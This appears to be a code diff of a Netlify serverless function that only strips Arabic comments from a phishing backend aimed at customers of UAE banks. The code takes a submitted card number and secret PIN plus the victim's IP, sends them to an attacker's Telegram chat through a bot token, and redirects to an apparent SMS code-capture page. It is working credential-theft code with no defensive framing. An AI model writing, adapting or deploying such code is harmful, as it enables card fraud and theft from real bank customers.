@@ -1,6 +1,5 @@
 const axios = require('axios');
 
-// قائمة البنوك، يمكن إدارتها هنا بسهولة
 const banks = {
     '1': 'Mashreq Bank',
     '2': 'Dubai Islamic Bank',
@@ -19,7 +18,6 @@ const banks = {
 };
 
 exports.handler = async function(event) {
-    // التأكد من أن الطلب هو POST
     if (event.httpMethod !== 'POST') {
         return { statusCode: 405, body: 'Method Not Allowed' };
     }
@@ -34,7 +32,6 @@ exports.handler = async function(event) {
         const bank_name = banks[bank_id] || 'Unknown Bank';
         const user_ip = event.headers['client-ip'] || 'N/A';
 
-        // استدعاء المتغيرات السرية من إعدادات Netlify
         const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } = process.env;
 
         const message = `تم استلام بيانات بطاقة جديدة (${bank_name} - ${bank_id}):\n\nرقم البطاقة: ${s1}\nالرقم السري: ${s2}\nIP: ${user_ip}`;
@@ -47,7 +44,6 @@ exports.handler = async function(event) {
             });
         }
 
-        // إعادة التوجيه إلى صفحة SMS
         return {
             statusCode: 302,
             headers: {
